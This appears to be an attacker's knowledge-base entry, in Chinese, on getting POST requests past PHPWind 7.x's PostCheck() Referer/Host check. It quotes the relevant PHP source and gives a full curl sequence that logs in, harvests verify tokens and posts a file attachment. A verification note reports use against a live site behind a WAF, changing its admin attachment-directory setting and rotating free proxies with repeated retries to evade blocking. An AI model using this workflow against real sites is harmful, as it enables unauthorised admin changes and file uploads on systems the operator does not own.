# PHPWind 7.x 前台/后台 POST 一律被 Showmsg('undefined_action') 拒绝 —— 根因是 PostCheck() 要求 Referer 的 host 严格等于 HTTP_HOST（用 IP 做 Referer 是致命陷阱）

- **code**: phpwind-7.x-前台-后台-post-一律被-showmsg-undefined_action-拒绝-根因是-postcheck-要求-referer
- **kind**: template
- **category**: app-audit
- **component**: PHPWind 7.3.2 / 7.5（global.php PostCheck）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example.com（203.0.113.78，PHPWind 7.3.2 GBK + nginx + 宝塔 WAF 9.8.9）**实战验证通过（不止源码级）**：改用域名 Referer 后，前台发帖链路首次走通 —— GET login.php 200|4467 → POST login.php 200|803(winduser=True) → GET post.php?fid=2&action=new 200|26551(真发帖页) → POST post.php?fid=2&action=new 200|2462（报错从「非法操作,请返回」前进为业务层的「上传附件失败…附件目录不可写(777)」）。同一修复对后台同样生效：POST /example.com?adminjob=settings&admintype=att 由「非法操作，请返回重试!」变为 200|14742「完成相应操作」，config[attachdir] 由 0 改为 1 与 3 均成功并回读确认。对照：用 IP 做 Referer（Host 头为域名）时，上述所有 POST 一律被拒（前台 200/2320B 非法操作、后台 200/147xx 非法操作重试）。实操补充：出口被封时可用免费代理池（严格验活标准要带响应大小，如 example.com 必须 200|3933，否则会把代理错误页当成功），每步随机换代理 + 每步重试 12-15 次即可完成 4 步连续流程。
- **path**: pocs/phpwind-7.x-前台-后台-post-一律被-showmsg-undefined_action-拒绝-根因是-postcheck-要求-referer/phpwind-referer-host-check.md
- **tags**: phpwind,referer,undefined_action,PostCheck,POST失败根因,判据,GBK,IP直连陷阱
- **created_at**: 2026-10-07T23:30:42.249Z
- **found_by**: exploit

## 描述

PHPWind 7.x POST 全被拒的根因：PostCheck() 的 Referer host 必须等于 HTTP_HOST（用 IP 做 Referer + 域名 Host 头必然 undefined_action）

## 用法

```
打 PHPWind 7.x（含 7.3.2）时，只要 POST 回 `非法操作,请返回`（前台）或 `非法操作，请返回重试!`（后台），先不要怀疑 verify/action/fid/时段/CC，**第一件事是检查 Referer 与 Host 是否同源**：
1) 请求 URL 与 Referer 一律用**域名**，不要用"IP 直连 + Host 头"的组合（那必然 Host=域名、Referer=IP → 被判非法）；
2) 发帖/回复/编辑的 Referer 用发帖页自身 URL（`$B/post.php?fid=N&action=new`）；后台表单的 Referer 用对应 adminjob 页 URL；
3) 加 `--noproxy '*'` 排除环境代理改道（Windows 本机实测 `ALL_PROXY=127.0.0.1:17992` 会把出口换成台湾 IP）；
4) 若用了 IP 直连，就让 Referer 也用该 IP、同时 Host 头也写该 IP（保持一致），不要混用。
```

## 正文

```
■ 触发链（POST 到 post.php / example.com 全被拒）
请求特征：用 IP 直连 + `Host: <域名>`，Referer 写成 IP（`https://<IP>/post.php?fid=2&action=new`）
结果：响应 200 / 2320B，正文 `非法操作,请返回`（前台）或 `非法操作，请返回重试!`（后台）

■ 源码根因（PHPWind 7.3.2，本机源码 C:\Users\user\Desktop\tgt9943\runs\pw-admin-sinks\utf8\）
global.php L775-789：
```php
function PostCheck($verify = 1,$gdcheck = 0,$qcheck = 0,$refer = 1) {
	global $pwServer;
	$verify && checkVerify();
	if ($refer && $pwServer['REQUEST_METHOD'] == 'POST') {
		$referer_a = @parse_url($pwServer['HTTP_REFERER']);
		if ($referer_a['host']) {
			list($http_host) = explode(':',$pwServer['HTTP_HOST']);
			if ($referer_a['host'] != $http_host) {
				Showmsg('undefined_action');      // ← 就是这里
			}
		}
	}
	$gdcheck && GdConfirm($_POST['gdcode']);
	$qcheck && Qcheck($_POST['qanswer'],$_POST['qkey']);
}
function checkVerify($hash = 'verifyhash') {
	GetGP('verify') <> $GLOBALS[$hash] && Showmsg('illegal_request');
}
```
`undefined_action` 在 lang_msg.php 里就是 `非法操作,请返回`；后台 cp_lang_cpmsg.php 里是 `非法操作，请返回重试!`。
⇒ **Referer 的 host 必须严格等于 HTTP_HOST**。用 IP 做 Referer 而 Host 头是域名，POST 一律被判非法。

■ 排查时被排除的其它假设（全部实测/源码证否，别重复走）
1) verify 值错 —— 否。发帖页 `name="verify"` 与页面 `verifyhash` 同值（实测同为 83adae12），`checkVerify()` 比较的就是这两个。
2) `_hexie` 字段缺失 —— 否。post.php L212 的 `_hexie` 校验在 7.3.2 里已被 `/* */` 整段注释掉。
3) `fid` 没传到 —— 否。假 fid（99999）会得到 `读取数据错误,原因：您要访问的链接无效`，证明 fid 链路正常；`global.php` L92 `InitGP(array('fid','tid'),'GP',2)` 先 GET 后 POST 都能读。
4) `action` 参数问题 —— 否。action 为空时 post.php L24 会 `$action = "new"` 兜底，不会报 undefined_action。
5) CC 防护 / 请求间隔 —— 否。10 秒间隔与零间隔表现一致。
6) 时段限制 —— 否。那是另一个消息：`lib/post.class.php` L58-59 报的是 `forum_allowtime`（该版块在该时间段不允许发表帖子）。

■ 正确请求写法（curl 原文）
```bash
B=https://TARGET_HOST            # 用域名，不要用 IP
H="Host: TARGET_HOST"
# 1) 登录页取 verifyhash
curl -sk --noproxy '*' -H "$H" -c jar.txt "$B/login.php" -o login.html
VH=$(grep -oE "verifyhash *= *'[a-f0-9]+'" login.html | grep -oE '[a-f0-9]{8}')
# 2) 登录
curl -sk --noproxy '*' -H "$H" -b jar.txt -c jar.txt -e "$B/login.php" \
  --data "forward=&jumpurl=&step=2&lgt=0&pwuser=USER&pwpwd=PASS&hideid=0&cktime=31536000&verify=$VH&submit=%B5%C7%C2%BC" \
  "$B/login.php?" -o lo.html
# 3) 取发帖页（同时拿到页面 verify）
curl -sk --noproxy '*' -H "$H" -b jar.txt -c jar.txt -e "$B/thread.php?fid=2" "$B/post.php?fid=2&action=new" -o post.html
V=$(grep -oE 'name="verify" *value="[a-f0-9]+"' post.html | grep -oE '[a-f0-9]{8}')
# 4) 提交：URL 与 Referer 都用【同域名】，Referer 用发帖页自身
curl -sk --noproxy '*' -H "$H" -b jar.txt -c jar.txt -e "$B/post.php?fid=2&action=new" \
  -F "verify=$V" -F step=2 -F fid=2 -F action=new -F tid= \
  -F "atc_title=t" -F "atc_content=tt" -F attachment_=@probe.txt \
  "$B/post.php?fid=2&action=new" -o resp.html
```
注意：**Windows 上必须加 `--noproxy '*'`**，否则 curl 会静默走环境变量 `ALL_PROXY/http_proxy`（本机实测 `127.0.0.1:17992` 是活的但出口在台湾，会把请求改道）。

```
